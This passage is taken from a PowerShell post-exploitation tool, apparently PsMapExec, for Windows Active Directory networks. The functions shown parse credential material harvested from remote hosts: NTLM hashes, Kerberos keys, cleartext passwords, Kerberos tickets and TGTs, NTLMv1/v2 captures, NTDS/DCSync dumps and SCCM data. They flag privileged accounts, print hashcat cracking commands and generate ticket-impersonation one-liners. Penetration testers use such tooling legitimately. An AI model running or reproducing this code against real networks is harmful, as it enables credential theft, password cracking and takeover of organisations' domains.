                Move-Item -Path $File.FullName -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"
            }
        }


        Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Sort-Object | Get-unique | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force
    
        # Sometimes blank NTLM values are duplicated, this should ensure they are removed from the file
        $filteredContent = Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Where-Object { $_ -notmatch ":$" }
        $filteredContent | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force

        # Print unique NTLM hashes within the banner
        Write-Host
        Write-Host "-------------------------------------- All collected NTLM User Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
        Write-Host
        Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt"
        Write-Host
        Write-Host "---------------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
        Write-Host 
        Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
        Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
        Write-Host "Show cracked NTLMs: " -NoNewline -ForegroundColor "Yellow"
        Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
        Write-Host

        if ($Rainbow) {
            RainbowCheck -Module "LogonPasswords" -RCFilePath "$LogonPasswords\.AllUniqueNTLM.txt"
        }
    }

    ################################################################################################################
    ################################################# Function: Parse-eKeys ########################################
    ################################################################################################################
    Function Parse-eKeys {
        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
    
        if ($Method -notin $AvailableMethods) { return }
        if ($Global:SuccessCount -eq 0) { return }

        Write-Host
        Write-Host "Parsing Results" -ForegroundColor "Yellow"
        Write-Host
        Start-Sleep -Seconds 1
        $outputFilePath = "$ekeys\.eKeys-Parsed.txt"

        # Initialize the DirectorySearcher outside of the loop for better performance
        $domainSearcher = New-Searcher

        Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
            $Computer = $_.BaseName -split '-eKeys' | Select-Object -First 1
    
            # Ensure the directory for this computer exists
            # Should probably alter this in the future so we dont wipe over existing data and instead rename it with a timestamp for historical data access
            New-Item -ItemType "Directory" -Path $eKeys -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$eKeys\$Computer"
    
            Write-Host
            Write-Host "-[$Computer]-"
            Write-Host

            $filePath = $_.FullName
            $fileContent = Get-Content -Path $filePath -Raw
            Move-Item -Path $filePath -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"

            # Regex for grabbing each "block" of data from output
            $blockPattern = '(?ms)(?i)(authentication id :.*?)(?=authentication id :|\z)'
            $blocks = [regex]::Matches($fileContent, $blockPattern)

            $uniqueGroups = @{}

            foreach ($block in $blocks) {
                $blockText = $block.Value

                # Extract the "User Name" from the block
                # This is essentially the "identifier" for each block. We can use this to skip (potentially) undesirable data blocks
                $userNamePattern = '(?mis)User\s+Name\s*:\s(.+?)\s*\r?\n'
                $userNameMatch = [regex]::Match($blockText, $userNamePattern)
                $BlockUserName = $userNameMatch.Groups[1].Value.Trim()

                # Might be a better idea in the future to consider skipping over particular well known SIDs instead
                if ($BlockUserName -like "DWM-*" -or $BlockUserName -like "UMFD-*") {
                    Write-Log "Skipping block with User Name: $BlockUserName"
                    continue
                }

                # Extract other details within the block
                $pattern = '(?mis)\s[\*\-]\s+Username\s:\s(.+?)\s*\r?\n\s*[\*\-]\s+Domain\s+:\s(.+?)\s*\r?\n\s*[\*\-]\s+Password\s:\s(.+?)\s*\r?\n\s*[\*\-]\s+Key List\s:\s(.*?)(?=\r?\n\s*[\*\-]\s+Username\s:|\r?\n\r?\n)'
                $match = [regex]::Match($blockText, $pattern)

                if ($match.Success) {
                    $username, $domain, $password, $keyList = $match.Groups[1..4].Value -split '\r?\n\s*'

                    if (([regex]::Matches($password, ' ')).Count -gt 10) {
                        $password = "(Hex Value: Redacted)"
                    }            
            
                    $domainUsername = "$($domain.ToLower())\$username"
                    $groupKey = $domainUsername

                    if (!$uniqueGroups.ContainsKey($groupKey)) {
                        $notes = ""  # This will store the notes

                        # Check for non-null passwords and username not ending with $
                        if ($password -ne "(null)" -and $password -ne "(Hex Value: Redacted)" -and ($username -notmatch '\$$')) {
                            $notes += "[Cleartext Password] "
                        }


                        # Reminder to self, perform this collection when the script is first run rather than doing this on a per user basis when parsing everytime
                        if (AdminCount -UserName $username -Searcher $domainSearcher) {
                            $notes += "[AdminCount=1] "
                        }

                        # Check for Empty Password hash
                        if ($keyList -match "rc4_hmac_nt\s+31d6cfe0d16ae931b73c59d7e0c089c0") {
                            $notes += "[rc4_hmac_nt=Empty Password] "
                        }

                        # Checks for group memberships
                        if ($DomainAdmins -contains $username) {
                            $notes += "[Domain Admin] "
                        }
                        if ($EnterpriseAdmins -contains $username) {
                            $notes += "[Enterprise Admin] "
                        }
                        if ($ServerOperators -contains $username) {
                            $notes += "[Server Operator] "
                        }
                        if ($AccountOperators -contains $username) {
                            $notes += "[Account Operator] "
                        }
                        if ($HyperVAdministrators -contains $username) {
                            $notes += "[Hyper-V Administrator] "
                        }
                        if ($StorageReplicateAdministrators -contains $username) {
                            $notes += "[Storage Replicate Administrator] "
                        }
                        if ($SchemaAdmins -contains $username) {
                            $notes += "[Schema Admin] "
                        }
                        if ($KeyAdmins -contains $username) {
                            $notes += "[Key Admin] "
                        }
                        if ($EnterpriseKeyAdmins -contains $username) {
                            $notes += "[Enterprise Key Admin] "
                        }
                        if ($DnsAdmins -contains $username) {
                            $notes += "[Dns Admin] "
                        }
                        if ($DHCPAdministrators -contains $username) {
                            $notes += "[DHCP Administrator] "
                        }
                        if ($GroupPolicyCreatorOwners -contains $username) {
                            $notes += "[Group Policy Creator Owner] "
                        }
                        if ($BackupOperators -contains $username) {
                            $notes += "[Backup Operator] "
                        }
                        if ($CertPublishers -contains $username) {
                            $notes += "[Cert Publisher] "
                        }
                        if ($PrintOperators -contains $username) {
                            $notes += "[Print Operator] "
                        }
                        if ($OrganizationManagement -contains $username) {
                            $notes += "[Organization Management] "
                        }
                        if ($ServerManagement -contains $username) {
                            $notes += "[Server Management] "
                        }

                        $group = [PSCustomObject]@{
                            DomainUsername = $domainUsername
                            KeyList        = $keyList | Where-Object { $_ -notmatch 'rc4_hmac_old|rc4_md4|rc4_hmac_nt_exp|rc4_hmac_old_exp|aes128_hmac' }
                            Password       = $password
                            Notes          = $notes
                        }

                        $uniqueGroups[$groupKey] = $group
                        Append-BHQuery -UserName $Username -Domain $Domain

                        Write-Host "Username    : $domainUsername"
                        if ($Password -eq "(null)" -or $Password -eq "" -or $Password -eq $null) {} Else { Write-Host "Password    : $password" }

                        foreach ($key in $group.KeyList) {
                            if (![string]::IsNullOrWhiteSpace($key)) {
                                $keyParts = $key.Trim() -split '\s+'
                                Write-Host "$($keyParts[0].ToLower()) : $($keyParts[1].ToLower())"
                                if ($username -notlike "*$*") {
                                    if ($keyParts[1].length -eq 32) { Append-BHQuery -UserName $Username -Domain $Domain -RC4 $($keyParts[1]) -RC4Property ; Append-BHQuery -UserName $Username -Domain $Domain -UserOwned }
                                    if ($keyParts[1].length -eq 64) { Append-BHQuery -UserName $Username -Domain $Domain -AES256 $($keyParts[1]) -AESProperty ; Append-BHQuery -UserName $Username -Domain $Domain -UserOwned }
                                }
                            }
                        }
                        if (-not [string]::IsNullOrWhiteSpace($notes)) {
                            Write-Host "Notes       : " -NoNewline
                            Write-Host $notes -ForegroundColor "Yellow" -NoNewline
                            Write-Host ""
                        }

                        Write-Host ""
                    }
                }

                # Store the raw block output in the computer's directory
                $blockFilePath = "$ComputerDirectory\$($Computer)_Block_$($BlockUserName).txt"
                Set-Content -Path $blockFilePath -Value $blockText
            }
        }
    }


    ################################################################################################################
    ############################################## Function: Parse-KerbDump ########################################
    ################################################################################################################

    function Parse-KerbDump {

        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
        if ($Method -notin $AvailableMethods) { return }
        
        if ($Global:SuccessCount -eq 0) { return }
        
        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
        Start-sleep -Seconds "2"

        # Initialize DirectorySearcher
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")

        # Grab each candidate file for parsing based on the name ending in "KerbDump.txt"
        Get-ChildItem -Path $Tickets -Filter "*KerbDump.txt" | 
        Where-Object { $_.Length -gt 0 } | 
        ForEach-Object {
            $Computer = $_.BaseName -split '-KerbDump' | Select-Object -First 1
            
            # Create the following flag to track output later
            $DisplayComputerName = $True

            # Create a directory in the name of the computer from which results are parsed from
            New-Item -ItemType "Directory" -Path $Tickets -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$Tickets\$Computer"

            # Read the file content
            $FileContent = Get-Content -Path $_.FullName -Raw

            # Define regex pattern to match ticket details
            $pattern = "Service Name\s+:\s+(.+?)`r?`nEncryptionType\s+:\s+(.+?)`r?`nTicket Exp\s+:\s+(.+?)`r?`nServer Name\s+:\s+(.+?)`r?`nUserName\s+:\s+(.+?)`r?`nFlags\s+:\s+(.+?)`r?`nSession Key Type\s+:\s+(.+?)`r?`n"

            # Match and extract details
            $matches = [regex]::Matches($fileContent, $pattern)
            foreach ($match in $matches) {
                $data = @{
                    ServiceName    = $match.Groups[1].Value
                    EncryptionType = $match.Groups[2].Value
                    TicketExp      = $match.Groups[3].Value
                    ServerName     = $match.Groups[4].Value
                    UserName       = $match.Groups[5].Value
                    Flags          = $match.Groups[6].Value
                    SessionKeyType = $match.Groups[7].Value
                }

                # Transform the username into a more common format "DOMAIN\Username"
                $userNameParts = $data.UserName -split '@'
                $domainName = ($userNameParts[1] -split '\.')[0]  # Extracting domain name before the dot
                $DomainUserName = $userNameParts[0]

                # If the name contains $ then drop results from current loop. We do not want to see Computer account tickets in results
                if ($DomainUserName -match '\$$') { Continue }

                # Initialize notes variable
                $notes = ""

                # Track if the user is considered "Privileged". Used to help maintain tidy output by omitting some flags if present
                $PrivilegedUser = $false  

                if ($DomainUserName -in $DomainAdmins) { 
                    $notes += "[Domain Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $EnterpriseAdmins) { 
                    $notes += "[Enterprise Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $ServerOperators) { 
                    $notes += "[Server Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $AccountOperators) { 
                    $notes += "[Account Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $HyperVAdministrators) { 
                    $notes += "[Hyper-V Administrator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $StorageReplicateAdministrators) { 
                    $notes += "[Storage Replicate Administrator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $SchemaAdmins) { 
                    $notes += "[Schema Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $KeyAdmins) { 
                    $notes += "[Key Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $EnterpriseKeyAdmins) { 
                    $notes += "[Enterprise Key Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $DnsAdmins) { 
                    $notes += "[Dns Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $DHCPAdministrators) { 
                    $notes += "[DHCP Administrator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $GroupPolicyCreatorOwners) { 
                    $notes += "[Group Policy Creator Owner] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $BackupOperators) { 
                    $notes += "[Backup Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $CertPublishers) { 
                    $notes += "[Cert Publisher] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $PrintOperators) { 
                    $notes += "[Print Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $OrganizationManagement) { 
                    $notes += "[Organization Management] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $ServerManagement) { 
                    $notes += "[Server Management] " 
                    $PrivilegedUser = $true
                }


                # Check AdminCount only if the user is not already identified as $PrivilegedUser
                if (-not $PrivilegedUser -and (AdminCount -UserName $DomainUserName -Searcher $Searcher)) {
                    $notes += "[AdminCount=1] "
                }

                # if a KRBTGT service is contained within the field, add the tag [TGT] to the results
                if ($data.ServiceName -match "krbtgt/") {
                    $notes += "[TGT] "
                }

                # Only present results if the note field has been populated. This means interesting results have been identified.
                if ($notes -ne "") {
                    if ($DisplayComputerName) {
                        Write-Host "`n`n-[$Computer]-`n"
                        $DisplayComputerName = $false
                    }
                    
                    Write-Host "User Name     : $($domainName.ToLower())\$($DomainUserName)"
                    Write-Host "Service Name  : $($data.ServiceName.ToLower())"
                    if ($data.ServiceName -match "krbtgt/") {} Else { Write-Host "Server Name   : $($data.ServerName.ToLower())" }
                    Write-Host "Ticket Expiry : $($data.TicketExp)"
                    Write-Host -NoNewline "Notes         : "
                    Write-Host -ForegroundColor "Yellow" -NoNewline "$notes"
                    Write-Host

                    # Logic to help pull just the ticket string
                    $ticketPattern = "-\[Ticket\]-`r?`n`r?`n(.+?)(?:`r?`n|$)"
                    $ticketStartPos = $match.Index + $match.Length
                    $ticketSearchText = $fileContent.Substring($ticketStartPos)
                    if ($ticketSearchText -match $ticketPattern) {
                        $ticketString = $Matches[1]
                        
                        # Replace '\' with '_' in ServiceName, Windows will not accept "/" as part of a file name
                        $data.ServiceName = $data.ServiceName.Replace('/', '@')
                        
                        # Form a path and file name made up of the ticket properties
                        $filePath = "$ComputerDirectory\$($data.UserName)-$($data.ServiceName).txt"
                        $ticketString | Out-File -FilePath $filePath -NoNewline -Encoding "ASCII"
                        
                        # Assign a random variable name to each ticket path to help produce tidy output to console for command generation
                        if ($notes -match "TGT") {
                            do {
                                $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
                            } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue -Scope Global)

                            Set-Variable -Name $randomVarName -Value $filePath -Scope Global
                        
                            # A neat one-liner instruction for the user
                            Write-Host "Impersonate   : PsMapExec -Targets $Targets -Method $Method -Ticket `$$randomVarName"
                            Write-Host
                        
                        }
                        Else { Write-Host }
                    }
                }
            }

            # Move and rename the file after processing
            $newFileName = ".$Computer.FullDump.txt"
            Move-Item -Path $_.FullName -Destination "$ComputerDirectory\$newFileName" -Force
        }

        Write-Host "`n`n[*] " -NoNewline -ForegroundColor "Yellow"
        Write-Host "Only interesting results have  been shown. Computer accounts are omitted"
        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
        Write-Host "Run with -NoParse to prevent parsing results in the future"
        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
        Write-Host "Each ticket has been stored in $Tickets"
    }

    function Parse-TGTDeleg {
        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
        if ($Method -notin $AvailableMethods) { 
            Write-Host "Method $Method is not in the available methods: $AvailableMethods" -ForegroundColor "Red"
            return 
        }

        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
        Start-Sleep -Seconds 2

        Write-Output ""

        if (-not (Test-Path $TGTDeleg)) {
            Write-Error "Directory $TGTDeleg does not exist."
            return
        }

        # Initialize DirectorySearcher
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")

        Get-ChildItem -Path $TGTDeleg -Filter "*.txt" | ForEach-Object {
            $fileContent = Get-Content -Path $_.FullName -Raw
            $Computer = $_.BaseName -split '-TGT' | Select-Object -First 1
            Write-Output ""
            Write-Output "-[$Computer]-"
            Write-Output ""

            # Define regex pattern to match Base64 encoded Kerberos ticket data
            $pattern = "doI[A-Za-z0-9+/=]+"

            # Match and extract details
            $matches = [regex]::Matches($fileContent, $pattern)
            foreach ($match in $matches) {
                $ticketData = $match.Value.Trim()

                # Generate a random variable name
                do {
                    $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
                } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue)

                # Set the variable to hold the ticket data in the global scope
                Set-Variable -Name $randomVarName -Value $ticketData -Scope Global

                # Verify the variable contains the ticket data
                $assignedValue = Get-Variable -Name $randomVarName -ValueOnly -Scope Global

                # Get ticket details
                $TicketDetails = Invoke-rTickets explain /ticket:$ticketData | Out-string

                # Parse the ticket details to get user and domain information
                $userName = ($TicketDetails | Select-String -Pattern 'UserName\s*:\s*(\S+)').Matches[0].Groups[1].Value
                $userDomain = ($TicketDetails | Select-String -Pattern 'UserDomain\s*:\s*(\S+)').Matches[0].Groups[1].Value
                $nameService = ($TicketDetails | Select-String -Pattern 'NameService\s*:\s*(\S+)').Matches[0].Groups[1].Value
                $ticketExpiry = ($TicketDetails | Select-String -Pattern 'End\s*:\s*(\d{2}/\d{2}/\d{4}\s+\d{2}:\d{2}:\d{2})').Matches[0].Groups[1].Value


                # Initialize notes variable
                $notes = ""

                # Check if the user is a member of any privileged groups
                $DomainUserName = "$userDomain\$userName"

                # Check AdminCount
                if (AdminCount -UserName $userName -Searcher $Searcher) {
                    $notes += "[AdminCount=1] "
                }

                # Check membership in privileged groups
                if ($userName -in $DomainAdmins) {
                    $notes += "[Domain Admin] "
                }
                if ($userName -in $EnterpriseAdmins) {
                    $notes += "[Enterprise Admin] "
                }
                if ($userName -in $ServerOperators) {
                    $notes += "[Server Operator] "
                }
                if ($userName -in $AccountOperators) {
                    $notes += "[Account Operator] "
                }
                if ($userName -in $HyperVAdministrators) {
                    $notes += "[Hyper-V Administrator] "
                }
                if ($userName -in $StorageReplicateAdministrators) {
                    $notes += "[Storage Replicate Administrator] "
                }
                if ($userName -in $SchemaAdmins) {
                    $notes += "[Schema Admin] "
                }
                if ($userName -in $KeyAdmins) {
                    $notes += "[Key Admin] "
                }
                if ($userName -in $EnterpriseKeyAdmins) {
                    $notes += "[Enterprise Key Admin] "
                }
                if ($userName -in $DnsAdmins) {
                    $notes += "[Dns Admin] "
                }
                if ($userName -in $DHCPAdministrators) {
                    $notes += "[DHCP Administrator] "
                }
                if ($userName -in $GroupPolicyCreatorOwners) {
                    $notes += "[Group Policy Creator Owner] "
                }
                if ($userName -in $BackupOperators) {
                    $notes += "[Backup Operator] "
                }
                if ($userName -in $CertPublishers) {
                    $notes += "[Cert Publisher] "
                }
                if ($userName -in $PrintOperators) {
                    $notes += "[Print Operator] "
                }
                if ($userName -in $OrganizationManagement) {
                    $notes += "[Organization Management] "
                }
                if ($userName -in $ServerManagement) {
                    $notes += "[Server Management] "
                }



                # Output the ticket details
                Write-Host "  User Name     : $DomainUserName"
                Write-Host "  Service Name  : $nameService"
                Write-Host "  Ticket Expiry : $ticketExpiry"

                # Output the notes
                if ($notes -ne "") {
                    Write-Host "  Notes         : " -NoNewline
                    Write-Host "$notes" -ForegroundColor "Yellow"
                }

                # Output the command for impersonation
                Write-Host "  Impersonate   : PsMapExec -Targets $Targets -Method WMI -Ticket `$$randomVarName"
                Write-Output ""

                # Move the processed file into a folder named after $Computer and save each ticket data
                $ComputerDirectory = "$TGTDeleg\$Computer"
                if (-not (Test-Path $ComputerDirectory)) {
                    New-Item -ItemType Directory -Path $ComputerDirectory -Force | Out-Null
                }
            
                # Create a filename based on user and ticket type
                $ticketFileName = "$ComputerDirectory\$userName-TGT.txt"
                $ticketData | Out-File -FilePath $ticketFileName -Encoding ASCII
            }

            # Move the original file to the computer directory after processing
            Move-Item -Path $_.FullName -Destination "$ComputerDirectory\.$Computer-All-Output.txt" -Force
        }
    }

    ################################################################################################################
    ######################################### Function: Parse-NTLM #################################################
    ################################################################################################################

    function Parse-NTLM {
        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
        
        if ($Method -notin $AvailableMethods) { return }
        if ($Global:SuccessCount -eq 0) { return }
        
        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
        Start-Sleep -Seconds 2

        if (-not (Test-Path $NTLM)) {
            Write-Error "Directory $NTLM does not exist."
            return
        }

        $uniqueNTLMv1 = @{}
        $uniqueNTLMv2 = @{}

        Get-ChildItem -Path $NTLM -Filter "*.txt" | Where-Object { $_.Name -ne ".All-NTLMv2.txt" -and $_.Name -ne ".All-NTLMv1.txt" } | ForEach-Object {
            $fileContent = Get-Content -Path $_.FullName -Raw
            $Computer = $_.BaseName

            Write-Output "`n-[$Computer]-`n"

            $ComputerDirectory = "$NTLM\$Computer"
            if (-not (Test-Path $ComputerDirectory)) {
                New-Item -ItemType Directory -Path $ComputerDirectory -Force | Out-Null
            
            }

            Move-Item -Path $_.FullName -Destination $ComputerDirectory -Force

            $AllNTLMFile = "$ComputerDirectory\$Computer-All-NTLM.txt"
            $fileContent | Out-File -FilePath $AllNTLMFile -Encoding ASCII

            $fileContent -split "\r?\n" | ForEach-Object {
                if ($_ -match '^(.*?)::(\w+):(\w+):(\w+):(\w+)$') {
                    $userName, $domain, $ntlmHash, $response, $endString = $matches[1..5]
                    $UserNTLMFile = "$ComputerDirectory\$userName-NTLM.txt"
                    $_ | Out-File -FilePath $UserNTLMFile -Append -Encoding ASCII

                    if ($endString -eq "1122334455667788") {
                        Write-Host "Obtained NTLMv1 hash for $userName"
                        if (-not $uniqueNTLMv1.ContainsKey($_)) {
                            $uniqueNTLMv1[$_] = $true
                        }
                    }
                    else {
                        Write-Host "Obtained NTLMv2 hash for $userName"
                        if (-not $uniqueNTLMv2.ContainsKey($_)) {
                            $uniqueNTLMv2[$_] = $true
                        }
                    }
                }
            }
        }

        Write-Output ""
        Write-Output ""



        if ($uniqueNTLMv2.Count -gt 0) {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Outputting all NTLMv2 results to $NTLM\All-NTLMv2.txt"
            $uniqueNTLMv2.GetEnumerator() | ForEach-Object {
                $_.Key | Out-File -FilePath "$NTLM\.All-NTLMv2.txt" -Append -Encoding ASCII
            }
        }
        else {
            Write-Host "No unique NTLMv2 hashes found"
        }

        if ($uniqueNTLMv1.Count -gt 0) {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Outputting all NTLMv1 results to $NTLM\All-NTLMv1.txt"
            $uniqueNTLMv1.GetEnumerator() | ForEach-Object {
                $_.Key | Out-File -FilePath "$NTLM\.All-NTLMv1.txt" -Append -Encoding ASCII
            }
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "You can check to see if the NTLMv1 password is known against https://shuck.sh/get-shucking.php"
        } 
    }


    ################################################################################################################
    ############################################## Function: Parse-NTDS ############################################
    ################################################################################################################

    function Invoke-NTDSParse {
        param (
            [string]$File,
            [array]$EnabledDomainUsers
        )

        $NTDSContent = Get-Content -Path $File

        $userHashes = @()
        $computerHashes = @()
        $identicalPasswordGroups = @{}
        $enabledIdenticalPasswordGroups = @{}
        $enabledUserHashes = @()
        $emptyPasswordUsers = @()
        $enabledEmptyPasswordUsers = @()
        $UsersWithAccountNameAsPassword = @()
        $EnabledUsersWithAccountNameAsPassword = @()

        foreach ($line in $NTDSContent) {
            $parts = $line -split ':'
            $user = $parts[0]
            $hash = $parts[3]

            if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
                $emptyPasswordUsers += $user
                if ($EnabledDomainUsers -contains $user) {
                    $enabledEmptyPasswordUsers += $user
                }
            }

            try {
                $NTValue = ConvertTo-NT -String $user
                if ($NTValue -eq $hash) {
                    $UsersWithAccountNameAsPassword += $user
                    if ($EnabledDomainUsers -contains $user) {
                        $EnabledUsersWithAccountNameAsPassword += $user
                
                    }
                }
            }
            Catch {}

            if ($user -like "*$*") {
                $computerHashes += $line
            }
            else {
                $userHashes += $line
                if ($hash -ne $null) {
                    if (-not $identicalPasswordGroups.ContainsKey($hash)) {
                        $identicalPasswordGroups[$hash] = @()
                    }
                    $identicalPasswordGroups[$hash] += $user

                    # Check if user is enabled and add to enabled identical password groups
                    if ($EnabledDomainUsers -contains $user) {
                        if (-not $enabledIdenticalPasswordGroups.ContainsKey($hash)) {
                            $enabledIdenticalPasswordGroups[$hash] = @()
                        }
                        $enabledIdenticalPasswordGroups[$hash] += $user
                    }
                }

                if ($EnabledDomainUsers -contains $user) {
                    $enabledUserHashes += $line
                }
            }
        }

        return @{
            userHashes                            = $userHashes
            enabledUserHashes                     = $enabledUserHashes
            computerHashes                        = $computerHashes
            emptyPasswordUsers                    = $emptyPasswordUsers
            enabledEmptyPasswordUsers             = $enabledEmptyPasswordUsers
            identicalPasswordGroups               = $identicalPasswordGroups
            enabledIdenticalPasswordGroups        = $enabledIdenticalPasswordGroups  # Return enabled identical password groups
            UsersWithAccountNameAsPassword        = $UsersWithAccountNameAsPassword
            EnabledUsersWithAccountNameAsPassword = $EnabledUsersWithAccountNameAsPassword
        }
    }

    function Parse-NTDS {
        param([string] $NTDSDirectory)

        $AvailableMethods = "WMI", "WinRM", "SMB", "DCSync"
        if ($Method -notin $AvailableMethods) { return }


        if ($Global:SuccessCount -eq 0) { return }

        Write-Host "`nParsing Results" -ForegroundColor "Yellow"
        Start-Sleep -Seconds 2
    
        $NTDS_Files = Get-ChildItem -Path $NTDSDirectory | Where-Object { $_.Name -Like "*.txt" } | Select-Object -ExpandProperty "FullName"

        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")
        $Searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
        $Searcher.PropertiesToLoad.AddRange(@("samAccountName"))
        $searcher.PageSize = 1000
        $users = $Searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
        $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }

        foreach ($NTDS_File in $NTDS_Files) {
            [string]$Date = @()
            $Date += (Get-date).TimeOfDay.Hours
            $Date += (Get-date).TimeOfDay.Minutes
            $Date += (Get-date).TimeOfDay.Seconds

            $results = Invoke-NTDSParse -File $NTDS_File -EnabledDomainUsers $EnabledDomainUsers
            $fileBaseName = [IO.Path]::GetFileNameWithoutExtension($NTDS_File)
            $outputDirectory = Join-Path $NTDSDirectory "${fileBaseName}_Parsed_${Date}"
            $UserData = Join-Path $outputDirectory "User Data"
            $ComputerData = Join-Path $outputDirectory "Computer Data"
            $FullDump = Join-Path $outputDirectory "Full NTDS Dump"

            if (-not (Test-Path -Path $outputDirectory)) {
                New-Item -Path $outputDirectory -ItemType Directory | Out-Null
            }

            if (-not (Test-Path -Path $UserData)) {
                New-Item -Path $UserData -ItemType Directory | Out-Null
            }

            if (-not (Test-Path -Path $ComputerData)) {
                New-Item -Path $ComputerData -ItemType Directory | Out-Null
            }

            if (-not (Test-Path -Path $FullDump)) {
                New-Item -Path $FullDump -ItemType Directory | Out-Null
            }

            $results.userHashes | Set-Content -Path (Join-Path $UserData  "1.All-User-Hashes.txt")
            $results.enabledUserHashes | Set-Content -Path (Join-Path $UserData  "1.Enabled-User-Hashes.txt")
            $results.computerHashes | Set-Content -Path (Join-Path $ComputerData "Computer-Hashes.txt") 
            $results.enabledEmptyPasswordUsers | Set-Content -Path (Join-Path $UserData "2.Enabled-Users-With-Empty-Passwords.txt")
            $results.emptyPasswordUsers | Set-Content -Path (Join-Path $UserData "2.All-Users-With-Empty-Passwords.txt")
            $results.UsersWithAccountNameAsPassword | Set-Content -Path (Join-Path $UserData "3.All-Users-With-Password-As-Account-Name.txt")
            $results.EnabledUsersWithAccountNameAsPassword | Set-Content -Path (Join-Path $UserData "3.Enabled-Users-With-Password-As-Account-Name.txt")

            # Output for grouped users with identical passwords who are enabled
            $groupNumber = 1
            $groupedUsersContent = foreach ($group in $results.enabledIdenticalPasswordGroups.GetEnumerator()) {
                if ($group.Value.Count -gt 1) {
                    Write-Output ""
                    $groupContent = "[Group $groupNumber]`n{0}" -f ($group.Value -join "`n")
                    $groupNumber++
                    $groupContent
                }
            }

            $groupedUsersContent | Set-Content -Path (Join-Path $UserData "4.Enabled-Users-With-Identical-Passwords.txt")
            Move-Item $NTDS_File -Destination "$FullDump" -Force
        }

        if ($Rainbow) {
            RainbowCheck -Module "NTDS" -RCFilePath "$UserData\1.Enabled-User-Hashes.txt"
        }

        Write-Output ""
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Parsed NTDS files stored in $NTDSDirectory"
    }

    ################################################################################################################
    ############################################## Function: Parse-SCCM ############################################
    ################################################################################################################

    function Parse-SCCM {

        if ($Global:SuccessCount -eq 0) { return }

        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
        Start-Sleep -Seconds 2

        Get-ChildItem -Path $SCCM -Filter '*-SCCM.txt' | ForEach-Object {
            $DirectoryName = $_.Name -replace "-SCCM.txt$"
            $DirectoryPath = Join-Path -Path $SCCM -ChildPath $DirectoryName
            New-Item -ItemType 'Directory' -Name $DirectoryName -Path $SCCM -Force | Out-Null

            $newFilePath = Join-Path -Path $DirectoryPath -ChildPath $_.Name
            Move-Item -Path $_.FullName -Destination $newFilePath -Force
            Process-File -FilePath $newFilePath -DirectoryPath $DirectoryPath -ComputerName $DirectoryName
            
        }
    }

    function Process-File {
        param (
            [string]$FilePath,
            [string]$DirectoryPath,
            [string]$ComputerName
        )

        [string]$DataOutput = Get-Content -Path $FilePath

        $TaskSequences = @()
        $UniqueSequences = @{}
        $UniqueCredentials = @{}
        $InterestingFiles = @()

